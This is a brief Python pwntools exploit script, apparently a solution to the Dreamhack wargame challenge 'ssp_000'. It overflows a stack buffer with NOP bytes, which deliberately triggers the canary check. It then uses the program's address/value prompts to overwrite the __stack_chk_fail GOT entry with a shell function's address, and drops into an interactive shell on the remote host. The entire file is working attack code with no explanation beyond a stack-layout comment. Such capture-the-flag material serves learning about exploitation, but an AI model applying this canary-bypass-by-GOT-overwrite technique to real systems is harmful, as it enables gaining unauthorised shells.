#!/usr/bin/env python3
from pwn import *

# p = process("./ssp_000")
e = ELF("./ssp_000")
p = remote("host2.dreamhack.games", 18106)
shell_addr = 0x00000000004008EA
canary_value = 0x9090909090909090
"""
[addr]  [0x8]
[value] [0x8]
[buf]   [0x48]
[canary] [0x8]

"""
payload = b"\x90" * (0x48 + 0x8) + p64(shell_addr)
p.sendline(payload)
p.recvuntil("r : ") #Addr : 
p.sendline(str(e.got['__stack_chk_fail']))
p.recvuntil("e : ") #value : 
p.sendline(str(0x4008ea))
p.interactive()